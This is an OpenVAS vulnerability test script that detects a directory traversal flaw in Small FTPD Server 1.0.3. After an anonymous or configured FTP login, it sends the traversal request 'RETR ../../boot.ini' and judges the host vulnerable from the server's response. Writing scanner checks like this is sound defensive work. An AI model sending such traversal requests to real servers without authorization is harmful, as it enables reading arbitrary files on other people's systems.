###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_small_ftpd_server_dir_trav_vun.nasl 14 2013-10-27 12:33:37Z jan $
#
# Small FTPD Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to read arbitrary files
  on the affected application.
  Impact Level: Application";
tag_affected = "Small FTPD Server version 1.0.3";
tag_insight = "The flaw is due to an error handling certain requests which can be
  exploited to download arbitrary files from the host system via directory
  traversal sequences in the filenames.";
tag_solution = "No solution or patch is available as of 02nd November, 2010. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/smallftpd/files/smallftpd/";
tag_summary = "The host is running Small FTPD Server and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(801534);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-11-04 14:21:53 +0100 (Thu, 04 Nov 2010)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_name("Small FTPD Server Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15358/");

  script_description(desc);
  script_summary("Check for the directory traversal attack on Small FTPD Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("220- smallftpd" >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

login_details = ftp_log_in(socket:soc1, user:"anonymous", pass:"anonymous");
if(!login_details)
{
  # Check for the user name and password
  domain = get_kb_item("Settings/third_party_domain");
  if(isnull(domain)) {
    domain = this_host_name();;
  }

  user = get_kb_item("ftp/login");
  pass = get_kb_item("ftp/password");

  ## Try for anomymous user and passwrd
  if(!user){
   user = "anonymous";
  }

  if(!pass){
   pass = string("secpod@", domain);
  }

   login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
}

if(login_details)
{
  ## Check the exploit
  result = ftp_send_cmd(socket: soc1, cmd:"RETR ../../boot.ini");

  ## Check the response after exploit
  if("150 Data connection ready." >< result){
      security_hole(ftpPort);
  }
}

ftp_close(socket:soc1);
